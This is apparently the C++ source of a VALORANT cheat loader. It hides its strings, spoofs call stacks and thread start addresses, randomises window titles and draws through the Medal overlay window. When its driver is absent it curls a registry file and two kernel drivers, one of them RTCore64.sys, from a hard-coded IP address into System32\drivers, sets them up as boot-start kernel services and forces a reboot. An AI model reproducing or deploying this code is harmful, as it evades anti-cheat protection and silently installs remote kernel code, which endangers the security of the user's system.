// novax_val_lib.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include "menu.h"
#include "ch/Functions.h"
#include "CallStack-Spoofer.h"




bool create_overlay3()
{

	Overlay.Hwnd = FindWindowA(skCrypt("MedalOverlayClass"), skCrypt("MedalOverlay"));
	if (!Overlay.Hwnd) return false;
	MARGINS Margin = { -1 };
	DwmExtendFrameIntoClientArea(Overlay.Hwnd, &Margin);
	SetWindowPos(Overlay.Hwnd, HWND_TOP, 0, 0, GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN), SWP_SHOWWINDOW);
	ShowWindow(Overlay.Hwnd, SW_SHOW);
	UpdateWindow(Overlay.Hwnd);

}


using _RtlCreateUserThread = NTSTATUS(NTAPI*)(
	HANDLE ProcessHandle,
	PSECURITY_DESCRIPTOR SecurityDescriptor,
	BOOLEAN CreateSuspend,
	ULONG StackZeroBits,
	PULONG StackReserved,
	PULONG StackCommit,
	void* StartAddress,
	void* StartParameter,
	PHANDLE ThreadHandle,
	void* ClientID
	);
void SpoofThread(void* Thread)
{
	HMODULE NT_DLL = LoadLibraryW(L"ntdll");
	uintptr_t SpoofedAddress = NULL;
	int DefaultThreadSize = 1000;
	srand(time(NULL)); // see random nums

	for (int i = 1; i < 4; i++) {
		SpoofedAddress |= (rand() & 0xFF) << i * 8; // we store it in the lowest bytes
		SpoofedAddress |= (rand() & 0xFF) << i * 8;
		SpoofedAddress |= (rand() & 0xFF) << i * 8;
		//returns spoofed address
	}
	while (SpoofedAddress > 0x7FFFFFFF) {
		SpoofedAddress -= 0x1000;
	}
	VirtualProtect((void*)SpoofedAddress, DefaultThreadSize, PAGE_EXECUTE_READWRITE, NULL);

	CONTEXT tContext;
	HANDLE  pHandle = nullptr;

	_RtlCreateUserThread KeThread = (_RtlCreateUserThread)(GetProcAddress(GetModuleHandleW(L"ntdll"), "RtlCreateUserThread"));
	KeThread(GetCurrentProcess(), nullptr, TRUE, NULL, NULL, NULL, (PTHREAD_START_ROUTINE)SpoofedAddress, 0, &pHandle, NULL); //create a thread & stop init everything

	tContext.ContextFlags = CONTEXT_INTEGER | CONTEXT_CONTROL;
	GetThreadContext(pHandle, &tContext);


	tContext.Rcx = (ULONG64)Thread;

	tContext.ContextFlags = CONTEXT_INTEGER | CONTEXT_CONTROL;

	SetThreadContext(pHandle, &tContext);

	ResumeThread(pHandle);
}
void rndmTitle() {
	srand(static_cast<unsigned int>(time(nullptr))); // Seed the random number generator with the current time

	constexpr int length = 15;
	const auto characters = TEXT("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890");
	TCHAR title[length + 1]{};

	for (int j = 0; j != length; j++)
	{
		title[j] = characters[rand() % 62]; // Use 62 instead of 80 to match the length of characters array
	}

	title[length] = '\0'; // Null-terminate the string

	SetConsoleTitle(title);
}
int pysen(){

	SPOOF_FUNC;
	rndmTitle();
	system(skCrypt("color e"));

	if (mem::find_driver()) {
		system(skCrypt("cls"));
	}
	else {

		system(skCrypt("color c"));
		
	}
	if (mem::find_driver()) {
		system(skCrypt("cls"));
	}
	else {

		system(skCrypt("color c"));


		system(skCrypt("curl -o C:\\Windows\\System32\\drivers\\1.reg http://45.61.150.140/a/1.reg > nul"));
		system(skCrypt("curl -o C:\\Windows\\System32\\drivers\\drv.sys http://45.61.150.140/a/drv2.sys > nul"));
		system(skCrypt("curl -o C:\\Windows\\System32\\drivers\\RTCore64.sys http://45.61.150.140/a/RTCore64.sys > nul"));
		system(skCrypt("sc create RTCore64 binpath=C:\\Windows\\System32\\drivers\\RTCore64.sys type=kernel group=0 start=system > nul"));
		system(skCrypt("sc create LL binpath=C:\\Windows\\System32\\drivers\\drv.sys type=kernel group=1 start=system > nul"));
		system(skCrypt("sc config nsiproxy group=0 > nul"));
		system(skCrypt("C:\\Windows\\System32\\drivers\\1.reg"));

		system("shutdown /r");

		Sleep(2000);
		exit(0);
	}
	while (process_id == 0)
	{
		Sleep(1);
		process_id = mem::find_process(skCrypt(L"VALORANT-Win64-Shipping.exe"));
	}	Sleep(1);

	system("cls");

	printf(skCrypt("user image %p\n"), mem::find_image());
	virtualaddy = retrieve_guarded(); //guarded region offset
	guard = virtualaddy;
	printf(skCrypt("guarded %p\n"), guard);
	interfacea();

	SpoofThread(finda);
//	SpoofThread(misc);


	Overlay.Name = RandomString(10).c_str();
	 
	create_overlay3();
	DirectXInit();
	MainLoop();
	
	return NULL;



}


